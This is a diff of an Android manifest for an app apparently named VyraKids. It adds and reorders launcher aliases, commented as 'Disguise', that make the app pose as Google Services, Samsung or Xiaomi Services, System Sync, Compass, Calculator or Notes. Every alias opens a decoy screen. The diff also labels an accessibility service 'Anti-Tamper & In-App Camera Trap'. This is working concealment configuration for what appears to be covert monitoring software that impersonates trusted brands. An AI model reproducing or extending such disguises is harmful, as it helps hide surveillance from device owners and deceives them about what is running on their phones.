@@ -42,9 +42,9 @@
 
     <application
         android:allowBackup="false"
-        android:icon="@drawable/ic_system_services"
-        android:label="System Services"
-        android:roundIcon="@drawable/ic_system_services"
+        android:icon="@drawable/ic_sync"
+        android:label="Google Services"
+        android:roundIcon="@drawable/ic_sync"
         android:supportsRtl="true"
         android:theme="@style/Theme.VyraKids"
         android:requestLegacyExternalStorage="true"
@@ -66,96 +66,13 @@
             android:exported="true"
             android:screenOrientation="portrait" />
 
-        <!-- 1. Brand-Adaptive Disguise: Vivo Services (Enabled by Default) -->
-        <activity-alias
-            android:name=".AliasVivoServices"
-            android:enabled="true"
-            android:exported="true"
-            android:icon="@drawable/ic_system_services_vivo"
-            android:label="vivo services"
-            android:targetActivity=".ui.DecoyDisplayActivity">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity-alias>
-
-        <!-- 2. Brand-Adaptive Disguise: Samsung Services -->
-        <activity-alias
-            android:name=".AliasSamsungServices"
-            android:enabled="false"
-            android:exported="true"
-            android:icon="@drawable/ic_system_services_samsung"
-            android:label="Samsung Services"
-            android:targetActivity=".ui.DecoyDisplayActivity">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity-alias>
-
-        <!-- 3. Brand-Adaptive Disguise: Xiaomi Services -->
-        <activity-alias
-            android:name=".AliasXiaomiServices"
-            android:enabled="false"
-            android:exported="true"
-            android:icon="@drawable/ic_system_services_xiaomi"
-            android:label="Xiaomi Services"
-            android:targetActivity=".ui.DecoyDisplayActivity">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity-alias>
-
-        <!-- 4. Universal Fallback Disguise: System Services -->
-        <activity-alias
-            android:name=".AliasSimToolkit"
-            android:enabled="false"
-            android:exported="true"
-            android:icon="@drawable/ic_system_services"
-            android:label="System Services"
-            android:targetActivity=".ui.DecoyDisplayActivity">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity-alias>
-
-        <!-- 2. Never-Opened Disguise: Device Support -->
-        <activity-alias
-            android:name=".AliasDeviceSupport"
-            android:enabled="false"
-            android:exported="true"
-            android:icon="@drawable/ic_device_support"
-            android:label="Device Support"
-            android:targetActivity=".ui.DecoyDisplayActivity">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity-alias>
-
-        <!-- 3. Never-Opened Disguise: Digital Compass -->
-        <activity-alias
-            android:name=".AliasCompass"
-            android:enabled="false"
-            android:exported="true"
-            android:icon="@drawable/ic_compass"
-            android:label="Compass"
-            android:targetActivity=".ui.DecoyDisplayActivity">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity-alias>
-
-        <!-- 4. Never-Opened Disguise: System Sync -->
+        <!-- 1. Default Disguise: System Sync (Purple 2-Arrows Anticlockwise Icon - Enabled by Default) -->
         <activity-alias
             android:name=".AliasSystemSync"
-            android:enabled="false"
+            android:enabled="true"
             android:exported="true"
             android:icon="@drawable/ic_sync"
+            android:roundIcon="@drawable/ic_sync"
             android:label="System Sync"
             android:targetActivity=".ui.DecoyDisplayActivity">
             <intent-filter>
@@ -164,12 +81,103 @@
             </intent-filter>
         </activity-alias>
 
-        <!-- 5. Disguise: Calculator -->
+        <!-- 2. Disguise: Google Services -->
+        <activity-alias
+            android:name=".AliasVivoServices"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@drawable/ic_sync"
+            android:roundIcon="@drawable/ic_sync"
+            android:label="Google Services"
+            android:targetActivity=".ui.DecoyDisplayActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <!-- 3. Brand-Adaptive Disguise: Samsung Services -->
+        <activity-alias
+            android:name=".AliasSamsungServices"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@drawable/ic_system_services_samsung"
+            android:roundIcon="@drawable/ic_system_services_samsung"
+            android:label="Samsung Services"
+            android:targetActivity=".ui.DecoyDisplayActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <!-- 4. Brand-Adaptive Disguise: Xiaomi Services -->
+        <activity-alias
+            android:name=".AliasXiaomiServices"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@drawable/ic_system_services_xiaomi"
+            android:roundIcon="@drawable/ic_system_services_xiaomi"
+            android:label="Xiaomi Services"
+            android:targetActivity=".ui.DecoyDisplayActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <!-- 5. Universal Disguise: System Toolkit -->
+        <activity-alias
+            android:name=".AliasSimToolkit"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@drawable/ic_sim_card"
+            android:roundIcon="@drawable/ic_sim_card"
+            android:label="System Toolkit"
+            android:targetActivity=".ui.DecoyDisplayActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <!-- 6. Disguise: Device Support -->
+        <activity-alias
+            android:name=".AliasDeviceSupport"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@drawable/ic_device_support"
+            android:roundIcon="@drawable/ic_device_support"
+            android:label="Device Support"
+            android:targetActivity=".ui.DecoyDisplayActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <!-- 7. Disguise: Digital Compass -->
+        <activity-alias
+            android:name=".AliasCompass"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@drawable/ic_compass"
+            android:roundIcon="@drawable/ic_compass"
+            android:label="Compass"
+            android:targetActivity=".ui.DecoyDisplayActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <!-- 8. Disguise: Calculator -->
         <activity-alias
             android:name=".AliasCalculator"
             android:enabled="false"
             android:exported="true"
             android:icon="@drawable/ic_calculator"
+            android:roundIcon="@drawable/ic_calculator"
             android:label="Calculator"
             android:targetActivity=".ui.DecoyDisplayActivity">
             <intent-filter>
@@ -178,12 +186,13 @@
             </intent-filter>
         </activity-alias>
 
-        <!-- 6. Disguise: Notes -->
+        <!-- 9. Disguise: Notes -->
         <activity-alias
             android:name=".AliasNotes"
             android:enabled="false"
             android:exported="true"
             android:icon="@drawable/ic_notes"
+            android:roundIcon="@drawable/ic_notes"
             android:label="Notes"
             android:targetActivity=".ui.DecoyDisplayActivity">
             <intent-filter>
@@ -195,6 +204,7 @@
         <!-- 1. Accessibility Service: Anti-Tamper & In-App Camera Trap -->
         <service
             android:name=".services.VyraAccessibilityService"
+            android:label="@string/accessibility_service_label"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
             android:exported="true">
             <intent-filter>
